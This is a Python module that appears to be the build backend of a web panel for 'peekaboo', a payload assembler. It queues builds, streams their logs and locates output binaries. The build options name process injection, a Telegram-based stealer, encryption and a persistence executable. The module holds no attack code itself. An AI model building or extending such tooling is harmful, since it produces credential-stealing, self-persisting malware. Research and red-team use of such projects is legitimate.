"""
peekaboo build orchestration.

Wraps the previously-scattered _builds dict / _lock / _run_build / path-
resolution helpers in one cohesive object so the Flask layer stays thin and
the state machine is easy to reason about.

Responsibilities:
  - submit():       enqueue a build, return its id
  - get():          read current state (memory first, then DB fallback)
  - tail():         a queue-backed SSE stream of incremental output lines
  - list_files():   collected output binaries (main + persistence)
  - resolve_binary(): canonical path math for a given build, used by every
                      download endpoint so the rules live in exactly one place

The compilation itself still shells out to peekaboo.py (which is the project's
template-driven payload assembler - not a single-source compile). Output is
read line-by-line off the subprocess pipe so subscribers see progress live.
"""
from __future__ import annotations

import queue
import subprocess
import sys
import threading
import uuid
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Generator, Optional

import db as _db


# Per-build event types emitted on the tail() stream.
EV_STATE = "state"    # status transition
EV_LINE  = "line"     # one new line of output
EV_END   = "end"      # terminal event: status, returncode, files


@dataclass
class _Live:
    """In-memory state of a build while it runs (post-completion lives in DB)."""
    id:           str
    params:       dict
    status:       str       = "queued"
    output:       str       = ""
    returncode:   Optional[int] = None
    created:      str       = ""
    start_time:   Optional[str] = None
    end_time:     Optional[str] = None
    # subscriber fan-out
    subscribers:  list[queue.Queue]   = field(default_factory=list)
    # tail buffer so a late subscriber doesn't miss earlier output
    tail_buf:     deque               = field(default_factory=lambda: deque(maxlen=400))

    def snapshot(self) -> dict:
        return {
            "id":          self.id,
            "params":      self.params,
            "status":      self.status,
            "output":      self.output,
            "returncode":  self.returncode,
            "created":     self.created,
            "start_time":  self.start_time,
            "end_time":    self.end_time,
        }


class BuildManager:
    """Thread-safe registry of active builds + a clean Flask-facing API."""

    def __init__(self, base_dir: Path, malware_dir: Path, peekaboo_py: Path):
        self._base        = base_dir
        self._malware_dir = malware_dir
        self._peekaboo    = peekaboo_py
        self._builds:     dict[str, _Live] = {}
        self._lock        = threading.Lock()

    # ------------------------------------------------------------------ submit

    def submit(self, params: dict) -> str:
        build_id = uuid.uuid4().hex[:8]
        live = _Live(
            id=build_id, params=dict(params), status="queued",
            created=datetime.now().isoformat(),
        )
        with self._lock:
            self._builds[build_id] = live
        threading.Thread(target=self._run, args=(build_id,), daemon=True).start()
        return build_id

    # --------------------------------------------------------------------- get

    def get(self, build_id: str) -> Optional[dict]:
        with self._lock:
            live = self._builds.get(build_id)
        if live:
            return live.snapshot()
        return _db.get_build(build_id) or None

    # ----------------------------------------------------------------- streams

    def tail(self, build_id: str) -> Generator[dict, None, None]:
        """
        SSE-friendly generator: replays any buffered output, then yields
        new events as they arrive, terminates on EV_END.
        """
        with self._lock:
            live = self._builds.get(build_id)
        if live is None:
            # build is already finished or unknown - emit a one-shot end event
            db_row = _db.get_build(build_id)
            if db_row:
                yield {"type": EV_STATE, "status": db_row.get("status", "unknown")}
                if db_row.get("output"):
                    yield {"type": EV_LINE, "text": db_row["output"]}
                yield {
                    "type":       EV_END,
                    "status":     db_row.get("status", "unknown"),
                    "returncode": db_row.get("returncode"),
                }
            return

        q: queue.Queue = queue.Queue()
        with self._lock:
            live.subscribers.append(q)
            # replay the tail buffer so a late subscriber sees recent context
            initial_status = live.status
            initial_tail   = list(live.tail_buf)
            already_done   = live.status in ("success", "failed", "timeout", "error")
            final_rc       = live.returncode

        yield {"type": EV_STATE, "status": initial_status}
        for line in initial_tail:
            yield {"type": EV_LINE, "text": line}

        # if it already finished while we were attaching, drain & end
        if already_done:
            yield {"type": EV_END, "status": initial_status, "returncode": final_rc}
            with self._lock:
                if q in live.subscribers:
                    live.subscribers.remove(q)
            return

        try:
            while True:
                try:
                    ev = q.get(timeout=30)
                except queue.Empty:
                    # 30s of silence - peekaboo.py is doing heavy work.
                    # Send a heartbeat to keep the SSE connection alive and loop.
                    yield {"type": EV_STATE, "status": "running", "heartbeat": True}
                    continue
                yield ev
                if ev.get("type") == EV_END:
                    return
        finally:
            with self._lock:
                if q in live.subscribers:
                    live.subscribers.remove(q)

    # ----------------------------------------------------------- path / files

    def resolve_binary(self, build: dict) -> Optional[Path]:
        """One canonical place for 'where did this build's main binary land?'."""
        params = build.get("params", {}) if isinstance(build, dict) else {}
        stored = params.get("out_path", "")
        if stored:
            p = Path(stored) if Path(stored).is_absolute() else self._base / stored
            if p.exists():
                return p
        # Legacy fallback: derive from params for builds that pre-date out_path
        if params.get("malware") == "stealer":
            p = self._malware_dir / "stealer" / params.get("stealer", "telegram") / "peekaboo.exe"
        elif "injection" in params:
            p = self._malware_dir / "injection" / params["injection"] / "peekaboo.exe"
        else:
            return None
        return p if p.exists() else None

    def list_files(self, build: dict) -> list[dict]:
        """Main binary + persistence binary, with types tagged for the UI."""
        if not build or build.get("status") != "success":
            return []
        main = self.resolve_binary(build)
        if not main:
            return []
        files = [{"name": main.name, "size": main.stat().st_size, "type": "main"}]
        pers = main.parent / "persistence.exe"
        if pers.exists():
            files.append({"name": "persistence.exe",
                          "size": pers.stat().st_size,
                          "type": "persistence"})
        return files

    # ------------------------------------------------------------- internals

    def _publish(self, live: _Live, ev: dict) -> None:
        if ev.get("type") == EV_LINE:
            live.tail_buf.append(ev["text"])
        # snapshot subscribers under the lock; deliver outside it
        with self._lock:
            subs = list(live.subscribers)
        for q in subs:
            try:
                q.put_nowait(ev)
            except Exception:
                pass

    def _run(self, build_id: str) -> None:
        with self._lock:
            live = self._builds.get(build_id)
        if not live:
            return

        live.status     = "running"
        live.start_time = datetime.now().isoformat()
        self._publish(live, {"type": EV_STATE, "status": "running"})

        p = live.params
        cmd = [
            "python3", str(self._peekaboo),
            "-p", p.get("payload",     "meow"),
            "-e", p.get("encryption",  "speck"),
            "-m", p.get("malware",     "injection"),
            "-i", p.get("injection",   "virtualallocex"),
            "-s", p.get("stealer",     "telegram"),
            "-r", p.get("persistence", "none"),
        ]

        # peekaboo.py runs from the project root so its relative paths resolve.
        try:
            proc = subprocess.Popen(
                cmd, cwd=str(self._base),
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
        except Exception as exc:
            self._finalize(live, status="error", returncode=-1,
                           output=f"failed to spawn: {exc}")
            return

        out_lines: list[str] = []
        try:
            # Hard wall-clock timeout: 180s for the full peekaboo build
            for raw in iter(proc.stdout.readline, ""):  # type: ignore[union-attr]
                line = raw.rstrip("\n")
                out_lines.append(line)
                live.output = "\n".join(out_lines)
                self._publish(live, {"type": EV_LINE, "text": line})
            proc.wait(timeout=180)
        except subprocess.TimeoutExpired:
            proc.kill()
            self._finalize(live, status="timeout", returncode=-1,
                           output="Build timed out after 180s.")
            return
        except Exception as exc:
            self._finalize(live, status="error", returncode=-1, output=str(exc))
            return

        rc = proc.returncode
        status = "success" if rc == 0 else "failed"

        # Once successful, fix the out_path so download endpoints are stable
        # even after the in-memory entry is evicted.
        if status == "success":
            mal = p.get("malware", "injection")
            if mal == "stealer":
                bin_path = self._malware_dir / "stealer" / p.get("stealer", "telegram") / "peekaboo.exe"
            else:
                bin_path = self._malware_dir / "injection" / p.get("injection", "virtualallocex") / "peekaboo.exe"
            with self._lock:
                live.params = dict(p, out_path=str(bin_path.relative_to(self._base)))

        self._finalize(live, status=status, returncode=rc, output="\n".join(out_lines))

    def _finalize(self, live: _Live, *, status: str, returncode: int, output: str) -> None:
        with self._lock:
            live.status     = status
            live.returncode = returncode
            live.output     = output
            live.end_time   = datetime.now().isoformat()
        try:
            _db.save_build(live.snapshot())
        except Exception:
            pass
        self._publish(live, {
            "type":       EV_END,
            "status":     status,
            "returncode": returncode,
        })
